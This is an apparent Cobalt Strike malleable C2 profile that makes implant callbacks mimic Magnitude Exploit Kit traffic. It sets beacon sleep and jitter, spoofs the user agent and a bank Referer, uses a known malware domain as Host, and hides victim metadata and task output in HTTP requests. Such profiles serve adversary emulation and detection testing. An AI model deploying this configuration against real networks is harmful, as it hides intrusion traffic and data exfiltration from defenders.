#
# Magnitude Exploit Kit traffic profile
#   http://malware-traffic-analysis.net/2014/06/17/index.html
#
# Author: @harmj0y
#

set sleeptime "45000"; # use a ~45s delay between callbacks
set jitter    "50"; # throw in a 50% jitter
set maxdns    "255";
set useragent "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)";

http-get {

    set uri "/themes/index.php";

    client {

        header "Accept" "image/jpeg, application/*";
        header "Referer" "http://www.bankofbotswana.bw/";
        header "Accept-Encoding" "gzip, deflate";

        # throw in a known bad malware domain
        header "Host" "wilfredcostume.bamoon.com";

        metadata {
            netbios;
            parameter "id";
        }
    }

    server {
        header "Server" "Apache/2.2.17 (Ubuntu)";
        header "X-Powered-By" "PHP/5.3.5-1ubuntu7.8";
        header "Content-Encoding" "gzip";
        header "Content-Type" "text/html";

        output {
            print;
        }
    }
}

http-post {

    set uri "/work/1.php";

    client {
    
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US;q=0.5,en;q=0.3";
        header "Accept-Encoding" "gzip, deflate";
        header "Content-Type" "application/octet-stream";

        id {
            netbiosu;
            parameter "sid";
        }

        output {
            print;
        }
    }

    server {

        header "Server" "Apache/2.2.17 (Ubuntu)";
        header "X-Powered-By" "PHP/5.3.5-1ubuntu7.8";
        header "Content-Encoding" "gzip";
        header "Content-Type" "text/html";

        output {
            print;
        }
    }
}

